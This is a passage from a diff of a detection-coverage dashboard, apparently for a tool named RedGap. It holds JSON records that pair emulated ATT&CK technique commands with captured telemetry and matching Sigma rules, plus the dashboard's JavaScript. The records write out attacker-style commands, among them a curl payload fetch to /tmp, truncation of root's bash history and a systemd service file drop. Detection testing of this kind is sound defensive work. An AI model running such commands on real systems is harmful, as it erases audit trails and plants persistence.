+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "ea34fb97-e2c4-4afb-810f-785e4459b194",
+        "detail": {
+          "command": "curl -s http://127.0.0.1:9/rgpayload -o /tmp/rgdl 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c curl -s http://127.0.0.1:9/rgpayload -o /tmp/rgdl 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/curl",
+              "cmd": "curl -s http://127.0.0.1:9/rgpayload -o /tmp/rgdl"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/rgdl"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/rgdl"
+            }
+          ],
+          "rule_title": "Curl Usage on Linux",
+          "rule_id": "ea34fb97-e2c4-4afb-810f-785e4459b194",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_curl_usage.yml",
+          "matched": {
+            "Image": "/usr/bin/curl"
+          },
+          "why": "'Curl Usage on Linux' fired on the real captured telemetry - matched on Image."
+        }
+      },
+      {
+        "id": "T1531",
+        "name": "Account Access Removal",
+        "tactics": [
+          "Impact"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "8a46f16c-8c4c-82d1-b121-0fdd3ba70a84",
+        "detail": {
+          "command": "groupadd rg_grp 2>/dev/null; groupdel rg_grp 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c groupadd rg_grp 2>/dev/null; groupdel rg_grp 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/sbin/groupadd",
+              "cmd": "groupadd rg_grp"
+            },
+            {
+              "image": "/usr/sbin/groupdel",
+              "cmd": "groupdel rg_grp"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c groupdel rg_grp 2>/dev/null; true"
+            },
+            {
+              "image": "/usr/sbin/groupdel",
+              "cmd": "groupdel rg_grp"
+            }
+          ],
+          "rule_title": "Group Has Been Deleted Via Groupdel",
+          "rule_id": "8a46f16c-8c4c-82d1-b121-0fdd3ba70a84",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_groupdel.yml",
+          "matched": {
+            "Image": "/usr/sbin/groupdel"
+          },
+          "why": "'Group Has Been Deleted Via Groupdel' fired on the real captured telemetry - matched on Image."
+        }
+      },
+      {
+        "id": "T1201",
+        "name": "Password Policy Discovery",
+        "tactics": [
+          "Discovery"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000007",
+        "detail": {
+          "command": "chage -l root 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c chage -l root 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/chage",
+              "cmd": "chage -l root"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Password Policy Discovery via chage",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000007",
+          "rule_path": "",
+          "matched": {
+            "CommandLine": "chage -l root",
+            "Image": "/usr/bin/chage"
+          },
+          "why": "'Password Policy Discovery via chage' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
+      },
+      {
+        "id": "T1614.001",
+        "name": "System Location Discovery: System Language Discovery",
+        "tactics": [
+          "Discovery"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000008",
+        "detail": {
+          "command": "locale 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c locale 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/locale",
+              "cmd": "locale"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "System Language Discovery via locale",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000008",
+          "rule_path": "",
+          "matched": {
+            "Image": "/usr/bin/locale"
+          },
+          "why": "'System Language Discovery via locale' fired on the real captured telemetry - matched on Image."
+        }
+      },
+      {
+        "id": "T1613",
+        "name": "Container and Resource Discovery",
+        "tactics": [
+          "Discovery"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000009",
+        "detail": {
+          "command": "cat /proc/1/cgroup 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cat /proc/1/cgroup 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/cat",
+              "cmd": "cat /proc/1/cgroup"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Container Discovery via /proc/1/cgroup",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000009",
+          "rule_path": "",
+          "matched": {
+            "CommandLine": "cat /proc/1/cgroup",
+            "Image": "/usr/bin/cat"
+          },
+          "why": "'Container Discovery via /proc/1/cgroup' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
+      },
+      {
+        "id": "T1070.003",
+        "name": "Indicator Removal: Clear Command History",
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000010",
+        "detail": {
+          "command": "truncate -s 0 /root/.bash_history 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c truncate -s 0 /root/.bash_history 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/truncate",
+              "cmd": "truncate -s 0 /root/.bash_history"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Clear Command History via truncate",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000010",
+          "rule_path": "",
+          "matched": {
+            "CommandLine": "truncate -s 0 /root/.bash_history",
+            "Image": "/usr/bin/truncate"
+          },
+          "why": "'Clear Command History via truncate' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
+      },
+      {
+        "id": "T1543.002",
+        "name": "Create or Modify System Process: Systemd Service",
+        "tactics": [
+          "Persistence",
+          "Privilege Escalation"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000011",
+        "detail": {
+          "command": "cp /etc/hostname /etc/systemd/system/redgap-test.service 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cp /etc/hostname /etc/systemd/system/redgap-test.service 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/cp",
+              "cmd": "cp /etc/hostname /etc/systemd/system/redgap-test.service"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /etc/systemd/system/redgap-test.service"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /etc/systemd/system/redgap-test.service"
+            }
+          ],
+          "rule_title": "Systemd Service File Creation",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000011",
+          "rule_path": "",
+          "matched": {
+            "CommandLine": "cp /etc/hostname /etc/systemd/system/redgap-test.service",
+            "Image": "/usr/bin/cp"
+          },
+          "why": "'Systemd Service File Creation' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       }
     ]
   }
@@ -1193,7 +4417,7 @@
   var TACTICS = ["Reconnaissance","Resource Development","Initial Access","Execution","Persistence",
     "Privilege Escalation","Defense Evasion","Credential Access","Discovery","Lateral Movement",
     "Collection","Command and Control","Exfiltration","Impact"];
-  var DATA = JSON.parse(document.getElementById("data").textContent);
+  var DATA = JSON.parse(document.getElementById("data").textContent || "{}");
   var view = "baseline";
 
   function esc(s) {
@@ -1202,102 +4426,95 @@
     });
   }
   function shortName(n) { return esc(String(n).replace(/^[^:]*:\s*/, "")); }
-  function cellClass(t) {
-    if (t.detected) return "det";
-    if (t.gap_type === "rule") return "gap-rule";
-    return "gap-base";
-  }
+  function cellClass(t) { return t.detected ? "det" : (t.gap_type === "rule" ? "gap-rule" : "gap-base"); }
   function pill(t) {
     if (t.detected) return '<span class="pill det">● detected</span>';
     if (t.gap_type === "rule") return '<span class="pill rule">● gap · rule</span>';
     return '<span class="pill base">● gap · base-rate</span>';
   }
 
-  // Accept both this dashboard's compact shape and a raw `redgap run` coverage.json.
   function normalizeCoverage(obj) {
     if (!obj || typeof obj !== "object" || !Array.isArray(obj.techniques)) {
       throw new Error("not a coverage report (no techniques array)");
     }
     var techs = obj.techniques.map(function (t) {
-      t = t && typeof t === "object" ? t : {}; // tolerate null/scalar elements
+      t = t && typeof t === "object" ? t : {};
       var rule = t.rule != null ? t.rule
         : (Array.isArray(t.firing_rules) && t.firing_rules.length ? t.firing_rules[0] : "");
       return {
-        id: String(t.id || "?"),
-        name: String(t.name || t.id || "?"),
+        id: String(t.id || "?"), name: String(t.name || t.id || "?"),
         tactics: Array.isArray(t.tactics) ? t.tactics.map(String) : [],
-        detected: !!t.detected,
-        gap_type: String(t.gap_type || (t.detected ? "none" : "rule")),
+        detected: !!t.detected, gap_type: String(t.gap_type || (t.detected ? "none" : "rule")),
         rule: String(rule || ""),
       };
     });
     var nDet = techs.filter(function (t) { return t.detected; }).length;
     var s = obj.summary || {};
-    // Coerce to a finite number so a hostile summary string cannot reach the DOM.
     var det = Number.isFinite(+s.detected) ? +s.detected : nDet;
     var gaps = Number.isFinite(+s.gaps) ? +s.gaps : techs.length - nDet;
     return { detected: det, gaps: gaps, techniques: techs };
   }
 
+  function sizeMatrix() {
+    var ms = document.querySelector(".matrix-scroll");
+    if (!ms) return;
+    var w = ms.clientWidth, gap = 10;
+    // how many WHOLE columns to show per view, so none is clipped at the right edge.
+    var n = w < 480 ? 2 : w < 680 ? 3 : w < 860 ? 4 : w < 1040 ? 5 : 6;
+    var col = Math.max(120, Math.floor((w - (n - 1) * gap) / n));
+    document.getElementById("matrix").style.setProperty("--col-w", col + "px");
+  }
+  window.addEventListener("resize", sizeMatrix);
+
   function render() {
     var d = DATA[view];
+    if (!d) return;
     document.getElementById("s-det").textContent = d.detected;
     document.getElementById("s-gap").textContent = d.gaps;
-
-    // matrix — group by tactic, appending any tactics not in the standard 14.
-    // Object.create(null): a "__proto__"/"constructor" tactic name can't hit a prototype.
     var byTactic = Object.create(null);
     d.techniques.forEach(function (t) {
       (t.tactics.length ? t.tactics : ["(untagged)"]).forEach(function (tac) {
         (byTactic[tac] = byTactic[tac] || []).push(t);
       });
     });
-    var cols = TACTICS.slice();
+    var cols = TACTICS.filter(function (t) { return byTactic[t]; });
     Object.keys(byTactic).forEach(function (k) { if (cols.indexOf(k) < 0) cols.push(k); });
     var m = document.getElementById("matrix");
     m.innerHTML = "";
     cols.forEach(function (tac) {
       var col = document.createElement("div");
       col.className = "tcol";
-      var techs = byTactic[tac] || [];
-      var cells = techs.map(function (t) {
-        return '<div class="cell ' + cellClass(t) + '"><div class="id">' + esc(t.id) +
+      var cells = (byTactic[tac] || []).map(function (t) {
+        return '<div class="cell ' + cellClass(t) + '" data-id="' + esc(t.id) +
+          '" role="button" tabindex="0" aria-label="Details for ' + esc(t.id) + '"><div class="id">' + esc(t.id) +
           '</div><div class="nm">' + shortName(t.name) + "</div></div>";
       }).join("");
       col.innerHTML = "<h4>" + esc(tac) + "</h4>" + (cells || '<div class="empty">—</div>');
       m.appendChild(col);
     });
-
-    // table
-    var tb = document.getElementById("tbody");
-    tb.innerHTML = d.techniques.map(function (t) {
-      var rule = t.rule ? '<span class="rule">' + esc(t.rule) + "</span>" : '<span class="muted">—</span>';
-      return "<tr><td><span class='tid'>" + esc(t.id) + "</span></td><td>" +
-        shortName(t.name) + "</td><td class='muted'>" + esc(t.tactics.join(" / ")) +
-        "</td><td>" + pill(t) + "</td><td>" + rule + "</td></tr>";
+    sizeMatrix();
+    document.getElementById("tbody").innerHTML = d.techniques.map(function (t) {
+      var rule = t.rule ? '<span class="rule">' + esc(t.rule) + "</span>" : '<span class="dim">—</span>';
+      return "<tr data-id='" + esc(t.id) + "'><td><span class='tid'>" + esc(t.id) + "</span></td><td>" + shortName(t.name) +
+        "</td><td class='dim'>" + esc(t.tactics.join(" / ")) + "</td><td>" + pill(t) + "</td><td>" + rule + "</td></tr>";
     }).join("");
   }
 
   function setView(v) {
     view = v;
-    [["tb-base", "baseline"], ["tb-fix", "fixed"], ["tb-custom", "custom"]].forEach(function (p) {
-      var b = document.getElementById(p[0]);
-      if (!b) return;
-      var on = v === p[1];
-      b.classList.toggle("on", on);
-      b.setAttribute("aria-pressed", on ? "true" : "false");
+    [["tb-base","baseline"],["tb-fix","fixed"],["tb-custom","custom"]].forEach(function (p) {
+      var b = document.getElementById(p[0]); if (!b) return;
+      var on = v === p[1]; b.classList.toggle("on", on); b.setAttribute("aria-pressed", on ? "true" : "false");
     });
     render();
   }
 
-  // Upload-your-own coverage.json — fully client-side; the file never leaves the browser.
+  // upload — fully client-side
   (function () {
-    var input = document.getElementById("upload");
-    var note = document.getElementById("upload-note");
+    var input = document.getElementById("upload"), note = document.getElementById("upload-note");
     if (!input) return;
     input.addEventListener("change", function () {
-      var file = input.files && input.files[0];
-      if (!file) return;
+      var file = input.files && input.files[0]; if (!file) return;
       var reader = new FileReader();
       reader.onload = function () {
         try {
@@ -1305,44 +4522,28 @@
           document.getElementById("tb-custom").style.display = "";
           note.innerHTML = "Loaded <b>" + esc(file.name) + "</b> — " + DATA.custom.detected +
             " detected, " + DATA.custom.gaps + " gaps. Parsed locally; nothing was uploaded.";
-          note.style.color = "";
           setView("custom");
-        } catch (e) {
-          note.textContent = "Could not read that file as a RedGap coverage.json: " + e.message;
-          note.style.color = "var(--red)";
-        }
+        } catch (e) { note.textContent = "Could not read that as a RedGap coverage.json: " + e.message; }
         input.value = "";
       };
-      reader.onerror = function () {
-        note.textContent = "Could not read that file.";
-        note.style.color = "var(--red)";
-      };
+      reader.onerror = function () { note.textContent = "Could not read that file."; };
       reader.readAsText(file);
     });
   })();
 
-  // theme toggle — persisted across reloads and state exposed to assistive tech
+  // theme — persisted + state exposed
   (function () {
-    var btn = document.getElementById("themeBtn");
-    var root = document.documentElement;
-    function isDark() {
-      var cur = root.getAttribute("data-theme");
-      return cur ? cur === "dark" : window.matchMedia("(prefers-color-scheme: dark)").matches;
-    }
-    try {
-      var saved = localStorage.getItem("redgap-theme");
-      if (saved === "dark" || saved === "light") root.setAttribute("data-theme", saved);
-    } catch (e) { /* localStorage unavailable */ }
+    var btn = document.getElementById("themeBtn"), root = document.documentElement;
+    function isDark() { var c = root.getAttribute("data-theme"); return c ? c === "dark" : window.matchMedia("(prefers-color-scheme: dark)").matches; }
+    try { var s = localStorage.getItem("redgap-theme"); if (s === "dark" || s === "light") root.setAttribute("data-theme", s); } catch (e) {}
     btn.setAttribute("aria-pressed", isDark() ? "true" : "false");
     btn.addEventListener("click", function () {
-      var dark = !isDark();
-      root.setAttribute("data-theme", dark ? "dark" : "light");
-      btn.setAttribute("aria-pressed", dark ? "true" : "false");
-      try { localStorage.setItem("redgap-theme", dark ? "dark" : "light"); } catch (e) { /* ignore */ }
+      var d = !isDark(); root.setAttribute("data-theme", d ? "dark" : "light"); btn.setAttribute("aria-pressed", d ? "true" : "false");
+      try { localStorage.setItem("redgap-theme", d ? "dark" : "light"); } catch (e) {}
     });
   })();
 
-  // reveal on scroll
+  // reveal-on-scroll
   (function () {
     var els = document.querySelectorAll(".reveal");
     if (!("IntersectionObserver" in window)) { els.forEach(function (e) { e.classList.add("in"); }); return; }
@@ -1350,6 +4551,126 @@
       ents.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); } });
     }, { threshold: 0.08 });
     els.forEach(function (e) { io.observe(e); });
+  })();
+
+  // hero terminal — reveal a real run, line by line
+  (function () {
+    var el = document.getElementById("term");
+    if (!el) return;
+    var lines = [
+      '<span class="p">$</span> pip install redgap',
+      '<span class="p">$</span> redgap run',
+      '<span class="c">REPLAY — re-evaluating real captured telemetry</span>',
+      '  T1548.001  Setuid/Setgid          <span class="ok">● detected</span>',
+      '  T1140      Base64 decode → shell  <span class="ok">● detected</span>',
+      '  T1053.003  Cron                   <span class="ok">● detected</span>',
+      '  T1070.006  Timestomp              <span class="bad">● gap (rule)</span>',
+      '  T1003.008  /etc/shadow read       <span class="bad">● gap (rule)</span>',
+      '  T1057      Process discovery      <span class="warn">● gap (base-rate)</span>',
+      '  <span class="c">… 45 more …</span>',
+      '',
+      '  <span class="ok">34</span>/51 detected · <span class="bad">17</span> gaps  <span class="c">(rule:12, base-rate:5)</span>',
+      '  <span class="c">→ find the red. close it. prove it.</span>',
+    ];
+    var reduce = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+    if (reduce) { el.innerHTML = lines.join("\n") + '<span class="cur"></span>'; return; }
+    var i = 0;
+    function step() {
+      el.innerHTML = lines.slice(0, i).join("\n") + (i < lines.length ? "\n" : "") + '<span class="cur"></span>';
+      if (i < lines.length) { i++; setTimeout(step, i <= 2 ? 320 : 150); }
+    }
+    step();
+  })();
+
+  // ---- Detection Playground: click a technique -> real evidence ----
+  function rawShort(n) { return String(n).replace(/^[^:]*:\s*/, ""); }
+  function attackUrl(id) { return "https://attack.mitre.org/techniques/" + String(id).replace(".", "/"); }
+  function block(label, inner) { return '<div class="blk"><div class="lbl">' + esc(label) + "</div>" + inner + "</div>"; }
+
+  function detailHTML(t) {
+    var d = t.detail || {};
+    var cls = t.detected ? "det" : (t.gap_type === "rule" ? "rule" : "base");
+    var h = [];
+    h.push('<div class="drow">' + pill(t) +
+      (t.tactics || []).map(function (x) { return '<span class="tac">' + esc(x) + "</span>"; }).join("") + "</div>");
+    if (d.command) {
+      h.push(block("Attacker command RedGap ran",
+        '<div class="cmd"><span class="p">$</span> ' + esc(d.command) + "</div>"));
+    }
+    if (d.telemetry && d.telemetry.length) {
+      var evs = d.telemetry.map(function (e) {
+        return '<div class="ev"><span class="img">' + esc(e.image) + '</span>  <span class="cl">' + esc(e.cmd) + "</span></div>";
+      }).join("");
+      h.push(block("Real captured telemetry (" + d.telemetry.length + " event" + (d.telemetry.length > 1 ? "s" : "") + ")",
+        '<div class="tele">' + evs + "</div>"));
+    }
+    if (t.detected && d.rule_title) {
+      var meta = "";
+      if (d.rule_id) meta += '<br><span class="img">id: ' + esc(d.rule_id) + "</span>";
+      if (d.rule_path) meta += '<br><span class="img">' + esc(d.rule_path) + "</span>";
+      h.push(block("Firing Sigma rule", '<div class="cmd">' + esc(d.rule_title) + meta + "</div>"));
+      if (d.matched && Object.keys(d.matched).length) {
+        var rows = Object.keys(d.matched).map(function (k) {
+          return '<div class="row"><span class="k">' + esc(k) + '</span><span class="v">' + esc(d.matched[k]) + "</span></div>";
+        }).join("");
+        h.push(block("Fields the rule matched", '<div class="kv">' + rows + "</div>"));
+      }
+    }
+    if (d.why) h.push(block(t.detected ? "Verdict" : "Why it's a gap", '<div class="whybox ' + cls + '">' + esc(d.why) + "</div>"));
+    if (!d.command && !d.telemetry) {
+      h.push(block("Note", '<div class="whybox base">Evidence detail ships for RedGap\'s own sample run. This is your uploaded verdict.</div>'));
+    }
+    h.push('<div class="blk"><a class="btn" href="' + esc(attackUrl(t.id)) + '" target="_blank" rel="noopener">ATT&amp;CK: ' + esc(t.id) + " ↗</a></div>");
+    return h.join("");
+  }
+
+  var _lastFocus = null;
+  function openDetail(id) {
+    var d = DATA[view]; if (!d) return;
+    var t = (d.techniques || []).filter(function (x) { return x.id === id; })[0];
+    if (!t) return;
+    document.getElementById("d-eyebrow").textContent = (t.tactics && t.tactics[0]) || "technique";
+    document.getElementById("d-title").textContent = t.id + " · " + rawShort(t.name);
+    document.getElementById("d-body").innerHTML = detailHTML(t);
+    var drawer = document.getElementById("drawer"), back = document.getElementById("dback");
+    _lastFocus = document.activeElement;
+    drawer.hidden = false; back.hidden = false;
+    requestAnimationFrame(function () { back.classList.add("open"); drawer.classList.add("open"); });
+    document.body.style.overflow = "hidden";
+    document.getElementById("d-close").focus();
+  }
+  function closeDetail() {
+    var drawer = document.getElementById("drawer"), back = document.getElementById("dback");
+    if (drawer.hidden) return;
+    back.classList.remove("open"); drawer.classList.remove("open");
+    document.body.style.overflow = "";
+    var reduce = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+    setTimeout(function () { drawer.hidden = true; back.hidden = true; }, reduce ? 0 : 260);
+    if (_lastFocus && _lastFocus.focus) _lastFocus.focus();
+  }
+  (function () {
+    document.getElementById("d-close").addEventListener("click", closeDetail);
+    document.getElementById("dback").addEventListener("click", closeDetail);
+    function hit(e) { return e.target.closest ? e.target.closest(".cell[data-id], tr[data-id]") : null; }
+    document.addEventListener("click", function (e) {
+      var el = hit(e); if (el) openDetail(el.getAttribute("data-id"));
+    });
+    document.addEventListener("keydown", function (e) {
+      if (e.key === "Escape") { closeDetail(); return; }
+      var drawer = document.getElementById("drawer");
+      if (e.key === "Tab" && !drawer.hidden) {
+        var f = drawer.querySelectorAll('button, a[href], input, [tabindex]:not([tabindex="-1"])');
+        if (!f.length) return;
+        var first = f[0], last = f[f.length - 1];
+        if (e.shiftKey && document.activeElement === first) { e.preventDefault(); last.focus(); }
+        else if (!e.shiftKey && document.activeElement === last) { e.preventDefault(); first.focus(); }
+        return;
+      }
+      if (e.key === "Enter" || e.key === " ") {
+        var el = hit(e);
+        if (el) { e.preventDefault(); openDetail(el.getAttribute("data-id")); }
+      }
+    });
   })();
 
   render();
